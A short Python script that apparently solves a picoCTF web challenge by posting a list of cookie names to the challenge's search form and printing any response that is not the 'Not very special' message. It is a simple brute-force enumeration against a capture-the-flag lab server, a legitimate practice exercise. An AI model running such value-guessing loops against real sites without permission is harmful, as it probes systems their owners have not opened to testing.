import requests

host = 'http://mercury.picoctf.net:6418/search'

s = requests.Session()

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

for cookie in cookie_names:
	data = { 'name' : cookie }
	r = s.post(host, data=data)
	if 'Not very special' in r.text:
		continue
	print(r.text)
